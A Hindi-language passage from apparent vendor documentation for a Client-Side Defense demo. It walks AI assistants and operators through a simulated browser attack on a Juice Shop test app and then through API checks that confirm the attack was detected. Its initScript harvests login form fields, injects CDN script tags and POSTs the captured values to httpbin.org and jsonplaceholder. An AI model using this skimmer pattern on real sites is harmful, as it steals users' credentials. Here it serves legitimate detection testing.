चरण 2 संरक्षित एप्लिकेशन के विरुद्ध अनुकरणित हमला ट्रैफ़िक उत्पन्न करता है और पुष्टि करता है कि CSD ने इसे पहचान लिया। आगे बढ़ने से पहले चरण 1 पूर्ण होना चाहिए — सभी स्टेप 7 जांचें PASS होनी चाहिए।

## स्टेप 8: हमला अनुकरण

<Aside type="note">
इस स्टेप के लिए ब्राउज़र-साइड JavaScript निष्पादन आवश्यक है — `curl` CSD डिटेक्शन को ट्रिगर नहीं कर सकता। ब्राउज़र ऑटोमेशन टूल्स (MCP Chrome DevTools, Playwright, Puppeteer) वाले AI सहायक नीचे दिए गए **AI-स्वचालित निष्पादन** अनुक्रम का उपयोग करके सीधे इन स्टेप्स को निष्पादित करते हैं। ब्राउज़र ऑटोमेशन के बिना ऑपरेटर मैन्युअल स्टेप्स करते हैं।
</Aside>

इन्फ्रास्ट्रक्चर सत्यापित होने के बाद (सभी चरण 1 स्टेप 7 जांचें PASS), CSD डिटेक्शन उत्पन्न करने के लिए हमला अनुकरण स्क्रिप्ट चलाएं। स्क्रिप्ट [डिटेक्शन ट्रिगर करें](/csd/trigger-detection/) गाइड और [अटैक स्क्रिप्ट लाइब्रेरी](/csd/attack-scripts/) में परिभाषित हैं।

### AI-स्वचालित निष्पादन

ब्राउज़र ऑटोमेशन टूल्स वाले AI सहायक हमला अनुकरण को प्रोग्रामेटिक रूप से चलाते हैं:

1. **initScript के साथ नेविगेट करें** — पहले एक स्वच्छ डॉक्यूमेंट संदर्भ सुनिश्चित करने के लिए `about:blank` पर नेविगेट करें (पूर्व नेविगेशन से पुराने initScripts से बचाता है), फिर `navigate_page` से `http://$F5XC_DOMAINNAME/#/login` पर एक `initScript` के साथ जो zone.js द्वारा पैच करने से पहले नेटिव `setInterval`, `clearInterval`, `fetch`, और `console.log` को सहेजता है, लॉगिन फॉर्म फ़ील्ड्स के लिए पोल करता है, नेटिव `HTMLInputElement.prototype.value` सेटर के माध्यम से क्रेडेंशियल भरता है, और तुरंत Combined Detection Script को इनलाइन निष्पादित करता है। नीचे दिए गए शब्दशः initScript का उपयोग करें।
2. **वेलकम बैनर खारिज करें** — वेलकम बैनर बंद करने के लिए `press_key` से `Escape` दबाएं। बाद की विज़िट में बैनर प्रकट नहीं हो सकता (कुकीज़ संरक्षित)। कुकी सहमति डायलॉग Escape कुंजी द्वारा स्वचालित रूप से खारिज हो जाता है
3. **पूर्ण होने की प्रतीक्षा करें** — सभी CDN स्क्रिप्ट लोड/एरर कॉलबैक और fetch प्रॉमिस रिज़ॉल्यूशन पूर्ण होने के लिए 10 सेकंड प्रतीक्षा करें
4. **साक्ष्य कैप्चर करें** — `list_console_messages` से `[CSD Demo] Simulation complete` और CDN लोड परिणामों की जांच करें; `list_network_requests` को `script` और `fetch` प्रकारों पर फ़िल्टर करके HTTP स्टेटस कोड सत्यापित करें (सफलता के लिए `200`/`201`, होल्ड किए गए अनुरोधों के लिए `pending`)

**चरण 2 initScript (शब्दशः — बिल्कुल जैसा लिखा है वैसा ही उपयोग करें):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**zone.js असंगतता** — Juice Shop Angular के zone.js का उपयोग करता है, जो `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest`, और अन्य ब्राउज़र API को पैच करता है। इससे MCP `evaluate_script`, `fill`, और `click` टूल्स `Cannot read properties of undefined (reading 'call')` के साथ विफल हो जाते हैं। इसके बजाय `navigate_page` का `initScript` के साथ उपयोग करें — `initScript` zone.js लोड होने से पहले चलता है, इसलिए आप नेटिव API संदर्भ सहेज सकते हैं और उन्हें पोलिंग कॉलबैक में उपयोग कर सकते हैं। initScript को फॉर्म फ़ील्ड भरने के लिए नेटिव `HTMLInputElement.prototype.value` सेटर का उपयोग करना चाहिए (`fill` का नहीं) और डिटेक्शन स्क्रिप्ट को इनलाइन चलाना चाहिए (`setTimeout` के माध्यम से नहीं, जिसे zone.js पेज लोड के बाद इंटरसेप्ट कर सकता है)। विवरण के लिए [डिटेक्शन ट्रिगर करें — AI-स्वचालित निष्पादन](/csd/trigger-detection/#ai-automated-execution) देखें।
</Aside>

<Aside type="note">
**initScript संचय** — `initScript` पैरामीटर के साथ प्रत्येक `navigate_page` कॉल स्क्रिप्ट को एक स्थायी सूची में जोड़ता है जो प्रत्येक बाद के डॉक्यूमेंट लोड पर चलती है। पुरानी स्क्रिप्ट के हस्तक्षेप से बचने के लिए, या तो रन के बीच `about:blank` पर नेविगेट करें या स्वच्छ ब्राउज़र संदर्भ के लिए `new_page` का `isolatedContext` के साथ उपयोग करें।
</Aside>

<Aside type="note">
**initScript में नेटिव `fetch` सहेजना** — initScript zone.js द्वारा पैच करने से पहले `window.fetch.bind(window)` को सहेजता है। यह सुनिश्चित करता है कि fetch कॉल zone.js `Cannot read properties of undefined` त्रुटियों के बिना सही ढंग से काम करें। वही initScript (नेटिव `fetch` सहेजे हुए) चरण 2 और चरण 3 दोनों हमला रन के लिए उपयोग किया जाता है — CSD मिटिगेशन `fetch()` कॉल को इंटरसेप्ट नहीं करता, इसलिए नेटिव संदर्भ सहेजना मिटिगेशन व्यवहार को प्रभावित नहीं करता।
</Aside>

<Aside type="caution">
**अस्थायी ओरिजिन 404** — Angular एप्लिकेशन पर पहली नेविगेशन पर, `polyfills.js` या अन्य ऐप स्क्रिप्ट ओरिजिन सर्वर से अस्थायी HTTP 404 लौटा सकती हैं। इससे Angular बूटस्ट्रैपिंग विफल हो जाती है, जिसके परिणामस्वरूप बिना लॉगिन फॉर्म के एक खाली पेज दिखता है। 404 क्षणिक है — बाद के अनुरोध 200 या 304 लौटाते हैं। **रिकवरी:** `about:blank` पर नेविगेट करें, 2 सेकंड प्रतीक्षा करें, फिर नेविगेशन पुनः प्रयास करें। यदि कई पुनः प्रयासों में समस्या बनी रहती है, तो लोड बैलेंसर पथ के माध्यम से ओरिजिन स्वास्थ्य जांचें (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`)।
</Aside>

### मैन्युअल निष्पादन

ब्राउज़र ऑटोमेशन टूल्स के बिना ऑपरेटर मैन्युअल रूप से स्टेप्स करते हैं:

1. संरक्षित एप्लिकेशन लॉगिन पेज पर **नेविगेट** करें: `http://xF5XC_DOMAINNAMEx/#/login`
2. **डमी क्रेडेंशियल दर्ज करें** — Email फ़ील्ड में `test@example.com` और Password फ़ील्ड में `P@ssword123` टाइप करें (फॉर्म सबमिट न करें)
3. **DevTools खोलें** — **F12** दबाएं और **Console** टैब पर स्विच करें
4. **Combined Detection Script चलाएं** — [डिटेक्शन ट्रिगर करें &mdash; Combined Simulation Script चलाएं](/csd/trigger-detection/#run-the-combined-simulation-script) से स्क्रिप्ट को कंसोल में पेस्ट करें और Enter दबाएं
5. **कंसोल आउटपुट सत्यापित करें** — पुष्टि करें कि `[CSD Demo]` चरणबद्ध आउटपुट दिखाता है: फ़ील्ड हार्वेस्टिंग, 4 CDN डोमेन से स्क्रिप्ट इंजेक्शन, और 2 एंडपॉइंट पर डेटा एक्सफ़िल्ट्रेशन

### क्या ट्रिगर होता है

| सिग्नल | व्यवहार | डिटेक्शन |
| --- | --- | --- |
| फॉर्म फ़ील्ड हार्वेस्टिंग | ईमेल और पासवर्ड इनपुट मान पढ़ता है | संवेदनशील फॉर्म फ़ील्ड पढ़ने वाली स्क्रिप्ट — उच्च जोखिम के रूप में फ़्लैग |
| स्क्रिप्ट इंजेक्शन | `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` से 4 `&lt;script&gt;` टैग इंजेक्ट करता है | 4 नए तृतीय-पक्ष स्क्रिप्ट डोमेन का पता लगाया (CDN उपलब्धता भिन्न हो सकती है) |
| डेटा एक्सफ़िल्ट्रेशन | `fetch` के माध्यम से `www.httpbin.org` और `jsonplaceholder.typicode.com` को हार्वेस्ट किया गया डेटा भेजता है | बाहरी डोमेन पर नेटवर्क कॉल |

<Aside type="note">
**CDN उपलब्धता भिन्न होती है।** प्रत्येक रन में सभी 4 CDN स्क्रिप्ट लोड नहीं होंगी — ब्राउज़र संसाधन सीमाएं, नेटवर्क स्थितियां, या CDN थ्रॉटलिंग के कारण कुछ `ERR_INSUFFICIENT_RESOURCES` या टाइमआउट के साथ विफल हो सकती हैं। यदि **कोई भी** CDN स्क्रिप्ट लोड होती है तो अनुकरण सफल है। CSD इंजेक्शन प्रयास का पता लगाता है चाहे स्क्रिप्ट सफलतापूर्वक लोड हो या न हो — `&lt;script&gt;` टैग का निर्माण स्वयं डिटेक्शन सिग्नल है।

गंभीर मामलों में, `ERR_INSUFFICIENT_RESOURCES` पेज-स्तरीय विफलता तक बढ़ सकता है — पूरा पेज खाली हो जाता है, स्क्रीनशॉट टाइमआउट हो जाते हैं, और `take_snapshot` विफल हो जाता है। यह आमतौर पर एक ही ब्राउज़र संदर्भ में भारी initScripts के साथ कई नेविगेशन जमा होने के बाद होता है। **रिकवरी:** एक ताज़ा ब्राउज़र संदर्भ बनाने के लिए `new_page` का `isolatedContext` के साथ उपयोग करें, फिर `about:blank` → initScript के साथ `navigate_page` अनुक्रम से पुनः प्रयास करें। यह व्यक्तिगत CDN स्क्रिप्ट विफलताओं से भिन्न है, जो अनुकरण की सफलता को प्रभावित नहीं करती हैं।
</Aside>

<Aside type="tip">
हमला अनुकरण चलाने के बाद, डिटेक्शन की प्रतीक्षा के लिए इस नियतात्मक पोलिंग लूप का उपयोग करें:

1. हर 60 सेकंड में `/detected_domains` क्वेरी करें
2. यदि DET-3 पास करता है (एक्सफ़िल डोमेन `/detected_domains` में दिखाई देते हैं), तुरंत स्टेप 9 पर आगे बढ़ें
3. यदि 10 क्वेरी (10 मिनट) के बाद भी खाली है, तो CSD स्थिति (चरण 1 स्टेप 5) और संरक्षित डोमेन पंजीकरण (चरण 1 स्टेप 6) जांचें — इनमें से एक संभवतः गलत कॉन्फ़िगर है
4. यदि 30 क्वेरी (30 मिनट) के बाद भी खाली है, तो रुकें और ऑपरेटर को रिपोर्ट करें — चरण 3 पर आगे न बढ़ें

अतिरिक्त लक्षित अनुकरणों (व्यक्तिगत हमला श्रेणियां, अधिकतम डिटेक्शन स्ट्रेस टेस्ट) के लिए, [अटैक स्क्रिप्ट लाइब्रेरी](/csd/attack-scripts/) देखें।
</Aside>

### साक्ष्य

AI सहायक को निम्नलिखित की रिपोर्ट करनी चाहिए। AI-स्वचालित निष्पादन के लिए, साक्ष्य `list_console_messages` के माध्यम से प्रोग्रामेटिक रूप से कैप्चर किया जाता है (initScript का पोलिंग फंक्शन कंसोल में परिणाम लॉग करता है)। मैन्युअल निष्पादन के लिए, ऑपरेटर ब्राउज़र कंसोल आउटपुट पढ़ता है।

| जांच | अपेक्षित | स्थिति |
| --- | --- | --- |
| लॉगिन पेज लोड हुआ | `http://$F5XC_DOMAINNAME/#/login` पर `200 OK` | PASS / FAIL |
| कंसोल स्क्रिप्ट निष्पादित हुई | कंसोल आउटपुट में `[CSD Demo] Simulation complete` | PASS / FAIL |
| फ़ील्ड हार्वेस्ट हुईं | कंसोल आउटपुट में गणना &gt; 0 | PASS |
| स्क्रिप्ट इंजेक्ट हुईं | कंसोल आउटपुट में 1–4 CDN डोमेन (कुछ संसाधन त्रुटियों के साथ विफल हो सकती हैं) | PASS यदि कोई भी CDN डोमेन दिखाई दे |
| एक्सफ़िल चैनल | कंसोल आउटपुट में 2 fetch POST प्रयास | PASS |

<Aside type="tip">
यदि HTTPS LB प्रमाणपत्र मान्य है (`CertificateValid`), तो आप वैकल्पिक रूप से `https://$F5XC_DOMAINNAME/#/login` के विरुद्ध भी अनुकरण चला सकते हैं। यह डेमो प्रगति के लिए आवश्यक नहीं है।
</Aside>

## स्टेप 9: API के माध्यम से डिटेक्शन सत्यापन

डिटेक्शन दिखाई दिए हैं यह पुष्टि करने के लिए CSD API एंडपॉइंट क्वेरी करें। पोलिंग लूप का उपयोग करें: हर 60 सेकंड में `/detected_domains` क्वेरी करें; जैसे ही DET-3 पास हो, आगे बढ़ें। यदि DET-3 10 मिनट बाद पास नहीं होता, तो CSD कॉन्फ़िगरेशन जांचें। यदि DET-3 30 मिनट बाद पास नहीं होता, तो रुकें और ऑपरेटर को रिपोर्ट करें। ये एंडपॉइंट [API संदर्भ](/csd/api-reference/) में प्रलेखित हैं और पिछले स्टेप्स के समान प्रमाणीकरण और नेमस्पेस का उपयोग करते हैं।

<Aside type="note">
**एंडपॉइंट प्रोसेसिंग क्रम:** `/detected_domains` सबसे पहले पॉपुलेट होता है और यह प्राथमिक संकेतक है कि CSD पाइपलाइन काम कर रही है। `/scripts` और `/formFields` धीमे बैकएंड प्रोसेसिंग शेड्यूल पर पॉपुलेट होते हैं और कई अनुकरण रन के बाद भी 20–30 मिनट तक खाली रह सकते हैं। यदि `/detected_domains` एक्सफ़िल डोमेन दिखाता है (`www.httpbin.org`, `jsonplaceholder.typicode.com`), तो अनुकरण को सफलतापूर्वक पहचाना गया मानें और आगे बढ़ें — नीचे DET-1 जांच इसे दर्शाती है।
</Aside>

### पहचानी गई स्क्रिप्ट

पिछले 24 घंटों में पहचानी गई स्क्रिप्ट के लिए क्वेरी करें:

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| फ़ील्ड | अपेक्षित | स्थिति |
| --- | --- | --- |
| `total` | &gt; 0 (स्क्रिप्ट पहचानी गईं) | PASS यदि &gt; 0; PENDING यदि 0 लेकिन `/detected_domains` एक्सफ़िल डोमेन दिखाता है |
| स्क्रिप्ट नाम | `script_name` में CDN डोमेन शामिल हैं (`cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`) | PASS यदि इंजेक्ट किए गए CDN डोमेन दिखाई दें |

### पहचाने गए डोमेन

```bash
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
```

| फ़ील्ड | अपेक्षित | स्थिति |
| --- | --- | --- |
| `total_domains` | &gt; 0 | PASS यदि &gt; 0 |
| डोमेन सूची | CDN और एक्सफ़िल डोमेन शामिल हैं | PASS यदि अपेक्षित डोमेन दिखाई दें |

### फॉर्म फ़ील्ड

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| फ़ील्ड | अपेक्षित | स्थिति |
| --- | --- | --- |
| `total` | &gt; 0 | PASS यदि &gt; 0; PENDING यदि 0 लेकिन DET-3 पास करता है |
| `name` | `email`, `password` शामिल हैं | PASS यदि संवेदनशील फ़ील्ड दिखाई दें |
| `sensitivity` | ईमेल/पासवर्ड फ़ील्ड के लिए `Sensitive` | PASS यदि ML ने सही वर्गीकृत किया |

<Aside type="note">
**फॉर्म फ़ील्ड प्रोसेसिंग डोमेन डिटेक्शन से धीमी है।** `/formFields` एंडपॉइंट पहली क्वेरी पर आंशिक मेटाडेटा के साथ फ़ील्ड लौटा सकता है। ML संवेदनशीलता वर्गीकरण (`Sensitive` बनाम `Not Sensitive`) बैकएंड प्रोसेसिंग पूर्ण होने के बाद पॉपुलेट होता है — यह पहले अनुकरण रन के बाद 20–30 मिनट ले सकता है। यदि फ़ील्ड दिखाई देती हैं लेकिन वर्गीकरण नहीं है, तो बाद में पुनः क्वेरी करें। DET-3 (`/detected_domains`) प्राथमिक पास मानदंड है।
</Aside>

### चरण 2 साक्ष्य सारांश

सभी डिटेक्शन क्वेरी के बाद, अंतिम डिटेक्शन स्थिति प्रस्तुत करें:

| टेस्ट ID | जांच | स्थिति |
| --- | --- | --- |
| DET-1 | स्क्रिप्ट पहचानी गईं (`/scripts` एंडपॉइंट) | PASS यदि &gt; 0; PENDING यदि खाली लेकिन DET-3 पास करता है |
| DET-2 | CDN डोमेन पहचाने गए | PASS / FAIL |
| DET-3 | एक्सफ़िल डोमेन पहचाने गए (`/detected_domains`) | **प्राथमिक संकेतक** — PASS यदि `www.httpbin.org` या `jsonplaceholder.typicode.com` दिखाई दें |
| DET-4 | फॉर्म फ़ील्ड पहचानी गईं (`/formFields` एंडपॉइंट) | PASS यदि &gt; 0; PENDING यदि खाली लेकिन DET-3 पास करता है |

<Aside type="note">
**चरण 3 पर आगे बढ़ने के लिए न्यूनतम पास मानदंड:** DET-3 PASS होना चाहिए (एक्सफ़िल डोमेन `/detected_domains` में दिखाई दें)। DET-1 और DET-4 पहले उपयोग पर या ताज़ा रीबिल्ड के बाद PENDING दिखा सकते हैं — यह सामान्य है। यदि DET-3 भी 30 मिनट बाद FAIL दिखाता है, तो सत्यापित करें कि CSD सक्षम है (चरण 1 स्टेप 5), संरक्षित डोमेन पंजीकृत है (चरण 1 स्टेप 6), और CSD JS टैग इंजेक्ट हो रहा है (चरण 1 स्टेप 7 JS कॉन्फ़िगरेशन जांच)।
</Aside>
